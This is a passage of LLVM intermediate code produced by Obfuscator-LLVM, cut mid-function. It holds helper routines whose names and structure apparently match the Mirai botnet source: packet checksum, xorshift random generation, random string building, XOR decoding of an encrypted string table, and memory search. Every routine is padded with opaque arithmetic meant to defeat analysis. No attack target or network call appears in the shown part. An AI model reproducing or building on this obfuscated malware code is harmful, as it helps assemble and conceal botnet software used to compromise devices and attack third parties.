  %71 = or i32 189930124, %69
  %72 = xor i32 %70, -1
  %73 = and i32 %72, %71
  %74 = and i32 %66, 65535
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, 205178429
  %77 = add i32 %76, %73
  %78 = sub i32 %77, 205178429
  %79 = add i32 %75, %73
  store i32 %78, i32* %12, align 4
  %80 = load i32, i32* %11, align 4
  %81 = lshr i32 %80, 16
  %82 = xor i32 %81, -1
  %83 = xor i32 65535, -1
  %84 = xor i32 711569163, -1
  %85 = or i32 %82, %83
  %86 = or i32 711569163, %84
  %87 = xor i32 %85, -1
  %88 = and i32 %87, %86
  %89 = and i32 %81, 65535
  %90 = load i32, i32* %12, align 4
  %91 = sub i32 0, %88
  %92 = sub i32 %90, %91
  %93 = add i32 %90, %88
  store i32 %92, i32* %12, align 4
  %94 = load i32, i32* %11, align 4
  %95 = xor i32 %94, -1
  %96 = xor i32 65535, -1
  %97 = xor i32 999060333, -1
  %98 = or i32 %95, %96
  %99 = or i32 999060333, %97
  %100 = xor i32 %98, -1
  %101 = and i32 %100, %99
  %102 = and i32 %94, 65535
  %103 = load i32, i32* %12, align 4
  %104 = sub i32 %103, 1315435062
  %105 = add i32 %104, %101
  %106 = add i32 %105, 1315435062
  %107 = add i32 %103, %101
  store i32 %106, i32* %12, align 4
  %108 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %109 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %108, i32 0, i32 6
  %110 = load i8, i8* %109, align 1
  %111 = zext i8 %110 to i16
  %112 = call zeroext i16 @htons(i16 zeroext %111) #7
  %113 = zext i16 %112 to i32
  %114 = load i32, i32* %12, align 4
  %115 = sub i32 %114, -1639177021
  %116 = add i32 %115, %113
  %117 = add i32 %116, -1639177021
  %118 = add i32 %114, %113
  store i32 %117, i32* %12, align 4
  %119 = load i16, i16* %7, align 2
  %120 = zext i16 %119 to i32
  %121 = load i32, i32* %12, align 4
  %122 = sub i32 %121, -1222292756
  %123 = add i32 %122, %120
  %124 = add i32 %123, -1222292756
  %125 = add i32 %121, %120
  store i32 %124, i32* %12, align 4
  br label %126

; <label>:126:                                    ; preds = %130, %54
  %127 = load i32, i32* %12, align 4
  %128 = lshr i32 %127, 16
  %129 = icmp ne i32 %128, 0
  br i1 %129, label %130, label %141

; <label>:130:                                    ; preds = %126
  %131 = load i32, i32* %12, align 4
  %132 = xor i32 65535, -1
  %133 = xor i32 %131, %132
  %134 = and i32 %133, %131
  %135 = and i32 %131, 65535
  %136 = load i32, i32* %12, align 4
  %137 = lshr i32 %136, 16
  %138 = sub i32 0, %137
  %139 = sub i32 %134, %138
  %140 = add i32 %134, %137
  store i32 %139, i32* %12, align 4
  br label %126

; <label>:141:                                    ; preds = %126
  %142 = load i32, i32* %12, align 4
  %143 = xor i32 %142, -1
  %144 = and i32 -95149447, %143
  %145 = xor i32 -95149447, -1
  %146 = and i32 %142, %145
  %147 = xor i32 -1, -1
  %148 = and i32 %147, -95149447
  %149 = and i32 -1, %145
  %150 = or i32 %144, %146
  %151 = or i32 %148, %149
  %152 = xor i32 %150, %151
  %153 = xor i32 %142, -1
  %154 = trunc i32 %152 to i16
  ret i16 %154
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, -1
  %7 = and i32 783493432, %6
  %8 = xor i32 783493432, -1
  %9 = and i32 %5, %8
  %10 = xor i32 %4, -1
  %11 = and i32 %10, 783493432
  %12 = and i32 %4, %8
  %13 = or i32 %7, %9
  %14 = or i32 %11, %12
  %15 = xor i32 %13, %14
  %16 = xor i32 %5, %4
  store i32 %15, i32* %1, align 4
  %17 = load i32, i32* %1, align 4
  %18 = lshr i32 %17, 8
  %19 = load i32, i32* %1, align 4
  %20 = xor i32 %19, -1
  %21 = and i32 %18, %20
  %22 = xor i32 %18, -1
  %23 = and i32 %19, %22
  %24 = or i32 %21, %23
  %25 = xor i32 %19, %18
  store i32 %24, i32* %1, align 4
  %26 = load i32, i32* @y, align 4
  store i32 %26, i32* @x, align 4
  %27 = load i32, i32* @z, align 4
  store i32 %27, i32* @y, align 4
  %28 = load i32, i32* @w, align 4
  store i32 %28, i32* @z, align 4
  %29 = load i32, i32* @w, align 4
  %30 = lshr i32 %29, 19
  %31 = load i32, i32* @w, align 4
  %32 = xor i32 %31, -1
  %33 = and i32 -2103340899, %32
  %34 = xor i32 -2103340899, -1
  %35 = and i32 %31, %34
  %36 = xor i32 %30, -1
  %37 = and i32 %36, -2103340899
  %38 = and i32 %30, %34
  %39 = or i32 %33, %35
  %40 = or i32 %37, %38
  %41 = xor i32 %39, %40
  %42 = xor i32 %31, %30
  store i32 %41, i32* @w, align 4
  %43 = load i32, i32* %1, align 4
  %44 = load i32, i32* @w, align 4
  %45 = xor i32 %44, -1
  %46 = and i32 -335299371, %45
  %47 = xor i32 -335299371, -1
  %48 = and i32 %44, %47
  %49 = xor i32 %43, -1
  %50 = and i32 %49, -335299371
  %51 = and i32 %43, %47
  %52 = or i32 %46, %48
  %53 = or i32 %50, %51
  %54 = xor i32 %52, %53
  %55 = xor i32 %44, %43
  store i32 %54, i32* @w, align 4
  %56 = load i32, i32* @w, align 4
  ret i32 %56
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %17, %2
  %10 = load i32, i32* %4, align 4
  %11 = sub i32 0, %10
  %12 = sub i32 0, -1
  %13 = add i32 %11, %12
  %14 = sub i32 0, %13
  %15 = add nsw i32 %10, -1
  store i32 %14, i32* %4, align 4
  %16 = icmp ne i32 %10, 0
  br i1 %16, label %17, label %27

; <label>:17:                                     ; preds = %9
  %18 = call i32 @rand_next()
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %20 = call i32 @util_strlen(i8* %19)
  %21 = urem i32 %18, %20
  %22 = zext i32 %21 to i64
  %23 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %22
  %24 = load i8, i8* %23, align 1
  %25 = load i8*, i8** %3, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %3, align 8
  store i8 %24, i8* %25, align 1
  br label %9

; <label>:27:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = xor i32 255, -1
  %14 = xor i32 %12, %13
  %15 = and i32 %14, %12
  %16 = and i32 %12, 255
  %17 = trunc i32 %15 to i8
  store i8 %17, i8* %5, align 1
  %18 = load i32, i32* @table_key, align 4
  %19 = lshr i32 %18, 8
  %20 = xor i32 %19, -1
  %21 = xor i32 255, -1
  %22 = xor i32 1980326786, -1
  %23 = or i32 %20, %21
  %24 = or i32 1980326786, %22
  %25 = xor i32 %23, -1
  %26 = and i32 %25, %24
  %27 = and i32 %19, 255
  %28 = trunc i32 %26 to i8
  store i8 %28, i8* %6, align 1
  %29 = load i32, i32* @table_key, align 4
  %30 = lshr i32 %29, 16
  %31 = xor i32 255, -1
  %32 = xor i32 %30, %31
  %33 = and i32 %32, %30
  %34 = and i32 %30, 255
  %35 = trunc i32 %33 to i8
  store i8 %35, i8* %7, align 1
  %36 = load i32, i32* @table_key, align 4
  %37 = lshr i32 %36, 24
  %38 = xor i32 255, -1
  %39 = xor i32 %37, %38
  %40 = and i32 %39, %37
  %41 = and i32 %37, 255
  %42 = trunc i32 %40 to i8
  store i8 %42, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %129, %1
  %44 = load i32, i32* %3, align 4
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 1
  %47 = load i16, i16* %46, align 8
  %48 = zext i16 %47 to i32
  %49 = icmp slt i32 %44, %48
  br i1 %49, label %50, label %135

; <label>:50:                                     ; preds = %43
  %51 = load i8, i8* %5, align 1
  %52 = zext i8 %51 to i32
  %53 = load %struct.table_value*, %struct.table_value** %4, align 8
  %54 = getelementptr inbounds %struct.table_value, %struct.table_value* %53, i32 0, i32 0
  %55 = load i8*, i8** %54, align 8
  %56 = load i32, i32* %3, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %55, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = xor i32 %60, -1
  %62 = and i32 605501904, %61
  %63 = xor i32 605501904, -1
  %64 = and i32 %60, %63
  %65 = xor i32 %52, -1
  %66 = and i32 %65, 605501904
  %67 = and i32 %52, %63
  %68 = or i32 %62, %64
  %69 = or i32 %66, %67
  %70 = xor i32 %68, %69
  %71 = xor i32 %60, %52
  %72 = trunc i32 %70 to i8
  store i8 %72, i8* %58, align 1
  %73 = load i8, i8* %6, align 1
  %74 = zext i8 %73 to i32
  %75 = load %struct.table_value*, %struct.table_value** %4, align 8
  %76 = getelementptr inbounds %struct.table_value, %struct.table_value* %75, i32 0, i32 0
  %77 = load i8*, i8** %76, align 8
  %78 = load i32, i32* %3, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = load i8, i8* %80, align 1
  %82 = sext i8 %81 to i32
  %83 = xor i32 %82, -1
  %84 = and i32 %74, %83
  %85 = xor i32 %74, -1
  %86 = and i32 %82, %85
  %87 = or i32 %84, %86
  %88 = xor i32 %82, %74
  %89 = trunc i32 %87 to i8
  store i8 %89, i8* %80, align 1
  %90 = load i8, i8* %7, align 1
  %91 = zext i8 %90 to i32
  %92 = load %struct.table_value*, %struct.table_value** %4, align 8
  %93 = getelementptr inbounds %struct.table_value, %struct.table_value* %92, i32 0, i32 0
  %94 = load i8*, i8** %93, align 8
  %95 = load i32, i32* %3, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds i8, i8* %94, i64 %96
  %98 = load i8, i8* %97, align 1
  %99 = sext i8 %98 to i32
  %100 = xor i32 %99, -1
  %101 = and i32 1053109926, %100
  %102 = xor i32 1053109926, -1
  %103 = and i32 %99, %102
  %104 = xor i32 %91, -1
  %105 = and i32 %104, 1053109926
  %106 = and i32 %91, %102
  %107 = or i32 %101, %103
  %108 = or i32 %105, %106
  %109 = xor i32 %107, %108
  %110 = xor i32 %99, %91
  %111 = trunc i32 %109 to i8
  store i8 %111, i8* %97, align 1
  %112 = load i8, i8* %8, align 1
  %113 = zext i8 %112 to i32
  %114 = load %struct.table_value*, %struct.table_value** %4, align 8
  %115 = getelementptr inbounds %struct.table_value, %struct.table_value* %114, i32 0, i32 0
  %116 = load i8*, i8** %115, align 8
  %117 = load i32, i32* %3, align 4
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %116, i64 %118
  %120 = load i8, i8* %119, align 1
  %121 = sext i8 %120 to i32
  %122 = xor i32 %121, -1
  %123 = and i32 %113, %122
  %124 = xor i32 %113, -1
  %125 = and i32 %121, %124
  %126 = or i32 %123, %125
  %127 = xor i32 %121, %113
  %128 = trunc i32 %126 to i8
  store i8 %128, i8* %119, align 1
  br label %129

; <label>:129:                                    ; preds = %50
  %130 = load i32, i32* %3, align 4
  %131 = add i32 %130, 1660968384
  %132 = add i32 %131, 1
  %133 = sub i32 %132, 1660968384
  %134 = add nsw i32 %130, 1
  store i32 %133, i32* %3, align 4
  br label %43

; <label>:135:                                    ; preds = %43
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_lock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i8* @table_retrieve_val(i32, i32*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

; <label>:11:                                     ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

; <label>:17:                                     ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %4
  store i32 -1, i32* %5, align 4
  br label %59

; <label>:16:                                     ; preds = %4
  store i32 0, i32* %10, align 4
  br label %17

; <label>:17:                                     ; preds = %51, %16
  %18 = load i32, i32* %10, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %17
  %22 = load i8*, i8** %6, align 8
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %49

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add i32 %36, -881937046
  %38 = add i32 %37, 1
  %39 = sub i32 %38, -881937046
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %11, align 4
  %41 = load i32, i32* %9, align 4
  %42 = icmp eq i32 %39, %41
  br i1 %42, label %43, label %48

; <label>:43:                                     ; preds = %35
  %44 = load i32, i32* %10, align 4
  %45 = sub i32 0, 1
  %46 = sub i32 %44, %45
  %47 = add nsw i32 %44, 1
  store i32 %46, i32* %5, align 4
  br label %59

; <label>:48:                                     ; preds = %35
  br label %50

; <label>:49:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %48
  br label %51

; <label>:51:                                     ; preds = %50
  %52 = load i32, i32* %10, align 4
  %53 = sub i32 0, %52
  %54 = sub i32 0, 1
  %55 = add i32 %53, %54
  %56 = sub i32 0, %55
  %57 = add nsw i32 %52, 1
  store i32 %56, i32* %10, align 4
  br label %17

; <label>:58:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %59

; <label>:59:                                     ; preds = %58, %43, %15
  %60 = load i32, i32* %5, align 4
  ret i32 %60
}

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind }
attributes #7 = { nounwind readnone }
attributes #8 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146846896}
!2 = !{i32 -2146846487}
